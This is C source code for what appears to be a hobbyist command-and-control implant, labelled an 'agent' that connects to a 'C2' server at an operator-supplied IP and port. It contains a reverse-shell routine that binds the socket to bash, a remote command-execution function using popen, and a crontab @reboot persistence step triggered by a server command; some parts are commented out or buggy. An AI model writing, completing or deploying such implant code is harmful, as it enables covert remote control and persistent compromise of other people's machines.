#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <getopt.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>

void spawn_shell(int socket) {
  dup2(socket,0);
  dup2(socket,1);
  dup2(socket,2);

  char * const argv[] = {"/bin/bash",NULL};
  execvp("/bin/bash",argv);
}

void log_error(int socket, const char *error_msg){
  printf("[Info] Sending error to the server\n");
  printf("%s\n",error_msg);
  char fmt_msg[2048];
  //snprintf(fmt_msg,sizeof(fmt_msg),"[Error] %s\n",error_msg);
  if(send(socket,error_msg,sizeof(error_msg),0)<0){
    printf("[Error] Error log failed (irony)\n");
    return;
    //If we cant send the error to the server, then what we can do with this error lol
  }
  return;
}
void add_to_cron(int socket) {
  char path[1024];
  ssize_t len = readlink("/proc/self/exe", path, sizeof(path));
  if(len!=-1){
    path[len]='\0';

    char crontab[2048];
    snprintf(crontab, sizeof(crontab),"(crontab -l 2>/dev/null; echo \"@reboot %s\") | crontab -",path);
    int result=system(crontab);
    if(result==0){
      printf("[Info] Added to crontab\n");
    } else {
      printf("[Err] Failed to add to crontab\n");
      log_error(socket,"[Error] zxczxczxczxczxcCron failed");
    }
  } else {
    printf("[Err] Failed to read process path\n");
  }
  return;
 }

void establish_connection(int socket){
  char command[]="Hello from clientzxczxc";
  printf("[Debug] Sending data\n");
  if(send(socket, command, strlen(command), 0) < 0){
    printf("[Debug] Failed to send data\n");
  }     
  return;    
}

void execute_command(int socket, char *command) {
  printf("[Debug] Trying to execute command\n");
  char buffer[1024];
  FILE *fp;
  fp=popen(command, "r");
  if(fp==NULL) {
    printf("[Debug] Failed command exec\n");
    strcpy(buffer, "[Err] Command execution failed");
    send(socket,buffer,strlen(buffer), 0);
    return;
  }
  printf("Command executed, trying to send\n");
  if(sizeof(buffer)==0) {
    printf("[Debug] No output, sending empty response\n");
    send(socket, "", 0, 0);
  }
  if(fgets(buffer,sizeof(buffer),fp)!=NULL) {
   printf("[Debug] Sending response\n");
   send(socket,buffer,strlen(buffer), 0);
  } else {
    printf("[Debug] No output, sending empty response\n");
    send(socket, "", 0, 0);
  }
  return;
}

int main(int argc, char *argv[]) {
  if(argc!=3) {
    printf("./agent <ip> <port>\n");
    return 0;
  }
  int sockd;
  char *ip=argv[1];
  int port =atoi(argv[2]);  
  struct sockaddr_in server_addr; 
  sockd=socket(AF_INET,SOCK_STREAM,0);
  if(sockd<0){
    perror("[Err] Failed socket creation");
    exit(-1);
  }
  server_addr.sin_family=AF_INET;
  server_addr.sin_port=htons(port);
  server_addr.sin_addr.s_addr=inet_addr(ip);
  if(connect(sockd,(struct sockaddr *)&server_addr,sizeof(server_addr))<0){
    perror("[Err] Connection failed");
    close(sockd);
    exit(-1);
  }
  printf("[Info] Connected to C2 at %s:%d\n",ip,port);
  establish_connection(sockd);
  int read_size=-1;
  char buffer[1024]; 
  while(1) {
    read_size=recv(sockd, buffer, sizeof(buffer), 0);
    if(read_size > 0) {
       buffer[read_size] = '\0';
       printf("[C2] %s", buffer);
    if (strncmp(buffer, "quit", 4) == 0) {
      printf("[Info] Quitting...\n");
      break;
    }
    if (strncmp(buffer, "cron", 4) == 0) {
      printf("[Info] Adding to crontab...\n");
      add_to_cron(sockd);
    }

    //execute_command(sockd, buffer);
    }
  }
  close(sockd);

  return 0;
}
